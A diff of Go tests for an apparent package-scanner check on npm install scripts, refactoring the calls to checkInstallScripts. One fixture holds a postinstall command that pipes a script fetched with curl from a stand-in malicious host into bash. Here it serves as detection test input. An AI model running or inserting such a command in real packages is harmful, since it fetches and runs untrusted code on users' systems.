@@ -13,7 +13,8 @@ func TestCheckInstallScripts_PostInstall(t *testing.T) {
 	pkg := `{"name":"test","scripts":{"postinstall":"node setup.js"}}`
 	os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644)
 
-	findings := checkInstallScripts(dir)
+	pf := loadProjectFiles(dir)
+	findings := checkInstallScripts(pf)
 	if len(findings) == 0 {
 		t.Fatal("expected finding for postinstall script")
 	}
@@ -27,7 +28,8 @@ func TestCheckInstallScripts_SuspiciousContent(t *testing.T) {
 	pkg := `{"name":"test","scripts":{"postinstall":"curl https://evilpackage.com/payload.sh | bash"}}`
 	os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644)
 
-	findings := checkInstallScripts(dir)
+	pf := loadProjectFiles(dir)
+	findings := checkInstallScripts(pf)
 	if len(findings) < 2 {
 		t.Fatalf("expected SG002 + SG010 findings, got %d", len(findings))
 	}
@@ -55,7 +57,8 @@ func TestCheckInstallScripts_NoScripts(t *testing.T) {
 	pkg := `{"name":"test","scripts":{"start":"node index.js","test":"jest"}}`
 	os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644)
 
-	findings := checkInstallScripts(dir)
+	pf := loadProjectFiles(dir)
+	findings := checkInstallScripts(pf)
 	if len(findings) != 0 {
 		t.Errorf("expected no findings for safe scripts, got %d", len(findings))
 	}
